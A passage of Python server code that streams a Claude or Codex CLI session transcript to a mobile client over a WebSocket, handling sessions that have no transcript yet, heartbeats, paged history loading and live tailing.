    # A freshly-spawned session often has no external_session_id yet — claude
    # writes its first JSONL a few hundred ms to a few seconds after spawn, and
    # codex only becomes bindable once post_spawn_bind finds its rollout;
    # reconciliation is also only partial in v1. A terminal 4500 here made the
    # mobile client permanently give up on a session that was about to become
    # chattable ("open a session → instant error"). Instead wait, bounded,
    # keeping the socket open and answering the client's heartbeat, until the id
    # appears.
    path = await _transcript_path_for(row)
    if path is None:
        # No transcript yet. The two CLIs differ sharply in when one appears:
        # claude writes its JSONL within seconds of spawn, whereas codex
        # registers NOTHING — no rollout, no thread row, hence no id — until
        # the first user turn. An idle codex parked on its splash screen can
        # sit there for hours.
        #
        # Treating that as an error made a perfectly usable session look
        # broken: open it on mobile and you got "waiting" then "disconnected",
        # indistinguishable from "codex is unsupported", when all it needed
        # was a first message. So while the session is LIVE, don't give up.
        # Announce an explicit `empty` status the client can render as an
        # empty chat with a composer — sending is a separate POST and works
        # with no transcript at all — keep answering heartbeats, and slip
        # into history+tail the moment a transcript shows up. Only a session
        # that already ended without one can never produce it; that case
        # stays bounded and closes retryable.
        live = row.status not in (SessionStatus.EXITED, SessionStatus.CRASHED)
        await ws.send_json(
            {
                "type": "session_status",
                "status": "empty" if live else "waiting",
                "external_session_id": row.external_session_id,
                "detail": (
                    "no transcript yet — send a message to start"
                    if live
                    else "session ended without a transcript"
                ),
            }
        )
        # Wall-clock deadline, NOT a per-timeout counter: a client that sends a
        # frame more often than once/sec (heartbeat, or a chatty reconnect) would
        # keep resetting a receive_text() timeout and never advance a tick-based
        # counter → the "bounded" wait would run unbounded. monotonic() is immune
        # to that regardless of client behavior. `None` = wait indefinitely,
        # which is safe: the loop still exits on disconnect.
        deadline = None if live else time.monotonic() + 30.0
        while True:
            if deadline is not None and time.monotonic() >= deadline:
                break
            try:
                msg = await asyncio.wait_for(ws.receive_text(), timeout=1.0)
                if msg == "ping":
                    await ws.send_json({"type": "pong"})
            except TimeoutError:
                pass
            except WebSocketDisconnect:
                return
            row = await mgr.get_session(sid)
            if row is None:
                await ws.close(code=4404)
                return
            # Only pay for path resolution once the row shows a binding —
            # for codex that means a filesystem scan, and re-running it every
            # second against an unbound session is pure waste (it provably
            # finds nothing until codex has written something).
            if row.external_session_id or getattr(row, "rollout_path", None):
                path = await _transcript_path_for(row)
                if path is not None:
                    break
            if deadline is None and row.status in (
                SessionStatus.EXITED, SessionStatus.CRASHED
            ):
                # Ended while we waited — stop waiting forever, but give the
                # final flush a moment to land.
                deadline = time.monotonic() + 5.0
        if path is None:
            # Retryable, not permanent: reconciliation may merely be lagging.
            await ws.send_json(
                {"type": "error", "detail": "session not ready yet, retrying"}
            )
            await ws.close(code=4503)
            return
    await ws.send_json(
        {
            "type": "session_status",
            "status": row.status.value,
            "external_session_id": row.external_session_id,
            "claude_session_id": row.external_session_id,
            "jsonl_path": str(path),
        }
    )

    send_lock = asyncio.Lock()

    def _client_gone(e: BaseException) -> bool:
        # A send that fails because the client already closed (clean 1005 /
        # WebSocketDisconnect / any ConnectionClosed*) is a benign race, not a
        # fault — logging it at ERROR with a full traceback spammed csm.log.
        return isinstance(e, WebSocketDisconnect) or "ConnectionClosed" in type(e).__name__

    async def on_event(event: dict) -> None:
        async with send_lock:
            try:
                await ws.send_json(event)
            except Exception as e:
                if _client_gone(e):
                    log.debug("session ws send skipped for %s (client gone): %r", sid, e)
                else:
                    log.exception("session ws send failed for %s", sid)

    # Full parsed history (cached across reconnects by mtime/size), but ship only
    # the TAIL so a 10-25MB transcript doesn't blast one multi-MB frame down a
    # slow tunnel (which used to drop and trigger a reconnect). Older pages load
    # on demand via a {"type":"load_history","before":<offset>} client message.
    HISTORY_TAIL = 400
    HISTORY_PAGE = 200
    events, parsed_offset = await get_history(path)
    total = len(events)
    first = max(0, total - HISTORY_TAIL)
    async with send_lock:
        try:
            await ws.send_json({
                "type": "history",
                "events": events[first:],
                "offset": first,
                "total": total,
                "truncated": first > 0,
                # Index of every message the human typed, across the WHOLE
                # transcript — not just the tail above. The mobile jump rail is
                # built from this: indexing only the shipped window meant a
                # busy session (this one runs ~80 events per turn, so 400
                # events ≈ 5 turns) silently dropped most of the user's
                # messages from the rail, while the first dot still sat at the
                # top as if it were the start of the conversation.
                #
                # `i` is an index into the same array `offset` addresses, so
                # the client can tell loaded from not-yet-loaded and page back
                # to reach one. Text is a snippet for the tap preview only.
                "nodes": _user_message_index(events),
            })
        except Exception as e:
            if _client_gone(e):
                log.debug("session ws history send skipped for %s (client gone): %r", sid, e)
            else:
                log.exception("session ws send failed for %s (history)", sid)

    # Live tail resumes exactly after the snapshot — no re-parse, no gap.
    tail = JsonlFastTail(path=path, on_event=on_event, poll_interval_sec=0.2)
    await tail.start(replay_from_start=False, start_offset=parsed_offset)

    try:
        while True:
            msg = await ws.receive_text()
            # App-level heartbeat: the mobile client pings so it can detect a
            # silently-dead socket (readyState stuck OPEN over a stalled SSH
            # tunnel). Reply so its staleness watchdog stays fed.
            if msg == "ping":
                async with send_lock:
                    try:
                        await ws.send_json({"type": "pong"})
                    except Exception:
                        break
                continue
            # Lazy older-history page request from the client on scroll-to-top.
            if msg.startswith("{"):
                try:
                    req = json.loads(msg)
                except (ValueError, TypeError):
                    continue
                if isinstance(req, dict) and req.get("type") == "load_history":
                    before = req.get("before")
                    if not isinstance(before, int):
                        before = first
                    before = max(0, min(before, total))
                    lo = max(0, before - HISTORY_PAGE)
                    if lo < before:
                        async with send_lock:
                            try:
                                await ws.send_json({
                                    "type": "history_page",
                                    "events": events[lo:before],
                                    "offset": lo,
                                })
                            except Exception:
                                break
    except WebSocketDisconnect:
        pass
    except Exception:
        log.exception("session ws receive failed for %s", sid)
    finally:
        await tail.stop()
